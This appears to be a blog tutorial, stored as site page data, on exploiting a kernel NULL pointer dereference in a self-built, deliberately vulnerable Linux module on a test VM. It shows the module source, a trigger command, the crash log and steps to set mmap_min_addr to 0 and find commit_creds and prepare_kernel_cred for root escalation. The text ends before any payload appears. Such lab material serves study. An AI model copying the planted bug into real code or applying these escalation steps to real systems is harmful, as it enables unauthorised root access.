{"componentChunkName":"component---src-templates-post-tsx","path":"/NULL-Dereference-Tutorial/","result":{"data":{"markdownRemark":{"html":"<h2 id=\"case\" style=\"position:relative;\"><a href=\"#case\" aria-label=\"case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Case</h2>\n<p>Let's get down to the point this time. I'll give an example code that has a NULL dereference vulnerability.\nThe testing Environment is like below.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ uname <span class=\"token operator\">-</span>a\nLinux ubuntu <span class=\"token number\">4.16</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">041600</span>rc1<span class=\"token operator\">-</span>generic #<span class=\"token number\">201802120030</span> SMP Mon Feb <span class=\"token number\">12</span> <span class=\"token number\">00</span><span class=\"token operator\">:</span><span class=\"token number\">31</span><span class=\"token operator\">:</span><span class=\"token number\">33</span> UTC <span class=\"token number\">2018</span> x86_64 x86_64 x86_64 GNU<span class=\"token operator\">/</span>Linux\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ lsb_release <span class=\"token operator\">-</span>a\nNo LSB modules are available<span class=\"token punctuation\">.</span>\nDistributor ID<span class=\"token operator\">:</span>\tUbuntu\nDescription<span class=\"token operator\">:</span>\tUbuntu Bionic <span class=\"token function\">Beaver</span> <span class=\"token punctuation\">(</span>development branch<span class=\"token punctuation\">)</span>\nRelease<span class=\"token operator\">:</span>\t<span class=\"token number\">18.04</span>\nCodename<span class=\"token operator\">:</span>\tbionic\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ uname <span class=\"token operator\">-</span>a\nLinux ubuntu <span class=\"token number\">4.16</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">041600</span>rc1<span class=\"token operator\">-</span>generic #<span class=\"token number\">201802120030</span> SMP Mon Feb <span class=\"token number\">12</span> <span class=\"token number\">00</span><span class=\"token operator\">:</span><span class=\"token number\">31</span><span class=\"token operator\">:</span><span class=\"token number\">33</span> UTC <span class=\"token number\">2018</span> x86_64 x86_64 x86_64 GNU<span class=\"token operator\">/</span>Linux\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ gcc <span class=\"token operator\">-</span>v\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\ngcc version <span class=\"token number\">7.3</span><span class=\"token number\">.0</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">7.3</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">3u</span>buntu1<span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"code\" style=\"position:relative;\"><a href=\"#code\" aria-label=\"code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code</h2>\n<p>Here's a Makefile &#x26; vulnerable code.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">obj<span class=\"token operator\">-</span>m <span class=\"token operator\">+=</span> bug1<span class=\"token punctuation\">.</span>o\n\nall<span class=\"token operator\">:</span>\n\tmake <span class=\"token operator\">-</span>C <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>modules<span class=\"token operator\">/</span>$<span class=\"token punctuation\">(</span>shell uname <span class=\"token operator\">-</span>r<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>build M<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>PWD<span class=\"token punctuation\">)</span> modules\n\nclean<span class=\"token operator\">:</span>\n\tmake <span class=\"token operator\">-</span>C <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>modules<span class=\"token operator\">/</span>$<span class=\"token punctuation\">(</span>shell uname <span class=\"token operator\">-</span>r<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>build M<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>PWD<span class=\"token punctuation\">)</span> clean</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/init.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/module.h></span> </span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/proc_fs.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/kernel.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span> vptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">proc_dir_entry</span> <span class=\"token operator\">*</span>my_proc <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token class-name\">ssize_t</span> <span class=\"token function\">my_write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span>file<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> len<span class=\"token punctuation\">,</span> <span class=\"token class-name\">loff_t</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">vptr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> len<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">file_operations</span> fops <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span>owner <span class=\"token operator\">=</span> THIS_MODULE<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">.</span>write <span class=\"token operator\">=</span> my_write\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> __exit <span class=\"token function\">my_exit_module</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">remove_proc_entry</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bug1\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] bug1 module unloaded\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> __init <span class=\"token function\">my_init_module</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    my_proc <span class=\"token operator\">=</span> <span class=\"token function\">proc_create</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bug1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0666</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>fops<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>my_proc <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>ENOMEM<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] bug1 module loaded\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>    \n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">module_init</span><span class=\"token punctuation\">(</span>my_init_module<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">module_exit</span><span class=\"token punctuation\">(</span>my_exit_module<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">MODULE_LICENSE</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GPL\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">MODULE_AUTHOR</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zer0day\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">MODULE_DESCRIPTION</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"null dereference test 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Clearly, we can notice that there's a NULL dereference vulnerability because of uninitialized pointer.\nSo, for triggering NULL dereference, we just simply call write function.</p>\n<p>First, compile a code &#x26; add a kernel module into the kernel by following command.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug1$ make all\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug1$ sudo insmod bug1<span class=\"token punctuation\">.</span>ko</code></pre></div>\n<p>Then. you can see a dmesg message</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8111.815103</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> bug1 module loaded</code></pre></div>\n<h2 id=\"bug\" style=\"position:relative;\"><a href=\"#bug\" aria-label=\"bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bug</h2>\n<p>The kernel module is loaded, then, let's trigger the bug! </p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug1$ echo asdf <span class=\"token operator\">></span> <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>bug1</code></pre></div>\n<p>Then, you can also see a dmesg like below.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452479</span><span class=\"token punctuation\">]</span> BUG<span class=\"token operator\">:</span> unable to handle kernel <span class=\"token constant\">NULL</span> pointer dereference <span class=\"token function\">at</span>           <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452483</span><span class=\"token punctuation\">]</span> IP<span class=\"token operator\">:</span>           <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452484</span><span class=\"token punctuation\">]</span> PGD <span class=\"token number\">0</span> P4D <span class=\"token number\">0</span> \n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452486</span><span class=\"token punctuation\">]</span> Oops<span class=\"token operator\">:</span> <span class=\"token number\">0010</span> <span class=\"token punctuation\">[</span>#<span class=\"token number\">1</span><span class=\"token punctuation\">]</span> SMP PTI\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452490</span><span class=\"token punctuation\">]</span> Modules linked in<span class=\"token operator\">:</span> <span class=\"token function\">bug1</span><span class=\"token punctuation\">(</span>OE<span class=\"token punctuation\">)</span> crct10dif_pclmul crc32_pclmul ghash_clmulni_intel pcbc aesni_intel aes_x86_64 crypto_simd glue_helper cryptd vmw_balloon intel_rapl_perf snd_ens1371 snd_ac97_codec gameport ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event snd_rawmidi snd_seq snd_seq_device snd_timer snd soundcore input_leds joydev serio_raw shpchp vmw_vsock_vmci_transport vsock vmw_vmci mac_hid binfmt_misc sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic usbhid hid vmwgfx psmouse ttm drm_kms_helper syscopyarea sysfillrect mptspi sysimgblt ahci mptscsih fb_sys_fops libahci mptbase drm e1000 scsi_transport_spi i2c_piix4 pata_acpi\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452519</span><span class=\"token punctuation\">]</span> CPU<span class=\"token operator\">:</span> <span class=\"token number\">0</span> PID<span class=\"token operator\">:</span> <span class=\"token number\">2630</span> Comm<span class=\"token operator\">:</span> bash Tainted<span class=\"token operator\">:</span> G           OE    <span class=\"token number\">4.16</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">041600</span>rc1<span class=\"token operator\">-</span>generic #<span class=\"token number\">201802120030</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452520</span><span class=\"token punctuation\">]</span> Hardware name<span class=\"token operator\">:</span> VMware<span class=\"token punctuation\">,</span> Inc<span class=\"token punctuation\">.</span> VMware Virtual Platform<span class=\"token operator\">/</span><span class=\"token number\">440</span>BX Desktop Reference Platform<span class=\"token punctuation\">,</span> BIOS <span class=\"token number\">6.00</span> <span class=\"token number\">05</span><span class=\"token operator\">/</span><span class=\"token number\">19</span><span class=\"token operator\">/</span><span class=\"token number\">2017</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452521</span><span class=\"token punctuation\">]</span> RIP<span class=\"token operator\">:</span> <span class=\"token number\">0010</span><span class=\"token operator\">:</span>          <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452522</span><span class=\"token punctuation\">]</span> RSP<span class=\"token operator\">:</span> <span class=\"token number\">0018</span><span class=\"token operator\">:</span>ffffb2ca82c63df0 EFLAGS<span class=\"token operator\">:</span> <span class=\"token number\">00010286</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452523</span><span class=\"token punctuation\">]</span> RAX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> RBX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000005</span> RCX<span class=\"token operator\">:</span> ffffb2ca82c63ef8\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452524</span><span class=\"token punctuation\">]</span> RDX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000005</span> RSI<span class=\"token operator\">:</span> <span class=\"token number\">000055</span>eaa6926008 RDI<span class=\"token operator\">:</span> ffff90717336c800\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452525</span><span class=\"token punctuation\">]</span> RBP<span class=\"token operator\">:</span> ffffb2ca82c63e00 R08<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> R09<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000001</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452525</span><span class=\"token punctuation\">]</span> R10<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000073</span> R11<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000246</span> R12<span class=\"token operator\">:</span> fffffffffffffffb\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452526</span><span class=\"token punctuation\">]</span> R13<span class=\"token operator\">:</span> ffffb2ca82c63ef8 R14<span class=\"token operator\">:</span> <span class=\"token number\">000055</span>eaa6926008 R15<span class=\"token operator\">:</span> ffff90717336c800\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452527</span><span class=\"token punctuation\">]</span> FS<span class=\"token operator\">:</span>  <span class=\"token number\">00007f</span><span class=\"token number\">225</span>ba2db80<span class=\"token punctuation\">(</span><span class=\"token number\">0000</span><span class=\"token punctuation\">)</span> GS<span class=\"token operator\">:</span><span class=\"token function\">ffff907239600000</span><span class=\"token punctuation\">(</span><span class=\"token number\">0000</span><span class=\"token punctuation\">)</span> knlGS<span class=\"token operator\">:</span><span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452528</span><span class=\"token punctuation\">]</span> CS<span class=\"token operator\">:</span>  <span class=\"token number\">0010</span> DS<span class=\"token operator\">:</span> <span class=\"token number\">0000</span> ES<span class=\"token operator\">:</span> <span class=\"token number\">0000</span> CR0<span class=\"token operator\">:</span> <span class=\"token number\">0000000080050033</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452529</span><span class=\"token punctuation\">]</span> CR2<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> CR3<span class=\"token operator\">:</span> <span class=\"token number\">0000000094256005</span> CR4<span class=\"token operator\">:</span> <span class=\"token number\">00000000003606f</span><span class=\"token number\">0</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452550</span><span class=\"token punctuation\">]</span> DR0<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> DR1<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> DR2<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452551</span><span class=\"token punctuation\">]</span> DR3<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> DR6<span class=\"token operator\">:</span> <span class=\"token number\">00000000fff</span>e0ff0 DR7<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000400</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452551</span><span class=\"token punctuation\">]</span> Call Trace<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452556</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> my_write<span class=\"token operator\">+</span><span class=\"token number\">0x19</span><span class=\"token operator\">/</span><span class=\"token number\">0x1f</span> <span class=\"token punctuation\">[</span>bug1<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452630</span><span class=\"token punctuation\">]</span>  proc_reg_write<span class=\"token operator\">+</span><span class=\"token number\">0x41</span><span class=\"token operator\">/</span><span class=\"token number\">0x70</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452646</span><span class=\"token punctuation\">]</span>  __vfs_write<span class=\"token operator\">+</span><span class=\"token number\">0x3a</span><span class=\"token operator\">/</span><span class=\"token number\">0x170</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452651</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> common_file_perm<span class=\"token operator\">+</span><span class=\"token number\">0x50</span><span class=\"token operator\">/</span><span class=\"token number\">0x140</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452652</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> apparmor_file_permission<span class=\"token operator\">+</span><span class=\"token number\">0x1a</span><span class=\"token operator\">/</span><span class=\"token number\">0x20</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452656</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> security_file_permission<span class=\"token operator\">+</span><span class=\"token number\">0x41</span><span class=\"token operator\">/</span><span class=\"token number\">0xc0</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452662</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> _cond_resched<span class=\"token operator\">+</span><span class=\"token number\">0x19</span><span class=\"token operator\">/</span><span class=\"token number\">0x40</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452663</span><span class=\"token punctuation\">]</span>  vfs_write<span class=\"token operator\">+</span><span class=\"token number\">0xb1</span><span class=\"token operator\">/</span><span class=\"token number\">0x1a0</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452665</span><span class=\"token punctuation\">]</span>  SyS_write<span class=\"token operator\">+</span><span class=\"token number\">0x55</span><span class=\"token operator\">/</span><span class=\"token number\">0xc0</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452670</span><span class=\"token punctuation\">]</span>  do_syscall_64<span class=\"token operator\">+</span><span class=\"token number\">0x76</span><span class=\"token operator\">/</span><span class=\"token number\">0x130</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452671</span><span class=\"token punctuation\">]</span>  entry_SYSCALL_64_after_hwframe<span class=\"token operator\">+</span><span class=\"token number\">0x21</span><span class=\"token operator\">/</span><span class=\"token number\">0x86</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452673</span><span class=\"token punctuation\">]</span> RIP<span class=\"token operator\">:</span> <span class=\"token number\">0033</span><span class=\"token operator\">:</span><span class=\"token number\">0x7f225b115054</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452674</span><span class=\"token punctuation\">]</span> RSP<span class=\"token operator\">:</span> <span class=\"token number\">002</span>b<span class=\"token operator\">:</span><span class=\"token number\">00007ff</span>cc697c628 EFLAGS<span class=\"token operator\">:</span> <span class=\"token number\">00000246</span> ORIG_RAX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000001</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452675</span><span class=\"token punctuation\">]</span> RAX<span class=\"token operator\">:</span> ffffffffffffffda RBX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000005</span> RCX<span class=\"token operator\">:</span> <span class=\"token number\">00007f</span><span class=\"token number\">225</span>b115054\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452675</span><span class=\"token punctuation\">]</span> RDX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000005</span> RSI<span class=\"token operator\">:</span> <span class=\"token number\">000055</span>eaa6926008 RDI<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000001</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452676</span><span class=\"token punctuation\">]</span> RBP<span class=\"token operator\">:</span> <span class=\"token number\">000055</span>eaa6926008 R08<span class=\"token operator\">:</span> <span class=\"token number\">000055</span>eaa6934ca8 R09<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000004</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452677</span><span class=\"token punctuation\">]</span> R10<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000073</span> R11<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000246</span> R12<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000005</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452678</span><span class=\"token punctuation\">]</span> R13<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000001</span> R14<span class=\"token operator\">:</span> <span class=\"token number\">00007f</span><span class=\"token number\">225</span>b3ec720 R15<span class=\"token operator\">:</span> <span class=\"token number\">00007f</span><span class=\"token number\">225</span>b3e83e0\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452679</span><span class=\"token punctuation\">]</span> Code<span class=\"token operator\">:</span>  Bad RIP value<span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452682</span><span class=\"token punctuation\">]</span> RIP<span class=\"token operator\">:</span>           <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span> RSP<span class=\"token operator\">:</span> ffffb2ca82c63df0\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452683</span><span class=\"token punctuation\">]</span> CR2<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">8123.452685</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token punctuation\">[</span> end trace b8845159e5bb387e <span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span></code></pre></div>\n<p>RIP is successfully changed into NULL ptr.</p>\n<h2 id=\"attack\" style=\"position:relative;\"><a href=\"#attack\" aria-label=\"attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack</h2>\n<p>NULL dereference is triggered, then. next level is just simply inserting a payload which gains root privileges to 0x0.</p>\n<p>But, in modern LK, default mmap min address is 65536, meaning that pre-setting min address to 0 for test.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug1$ sudo sysctl <span class=\"token operator\">-</span>w vm<span class=\"token punctuation\">.</span>mmap_min_addr<span class=\"token operator\">=</span><span class=\"token number\">0</span>\nvm<span class=\"token punctuation\">.</span>mmap_min_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span></code></pre></div>\n<p>And of course, getting root privileges, we need to call <strong>commit<em>creds(prepare</em>kernel_cred(0))</strong>.\nThey can get from <em>/proc/kallsyms</em></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug1$ sudo cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>kallsyms <span class=\"token operator\">|</span> grep commit_creds\nffffffffb26adf00 T commit_creds\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug1$ sudo cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>kallsyms <span class=\"token operator\">|</span> grep prepare_kernel_cred\nffffffffb26ae2b0 T prepare_kernel_cred\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span 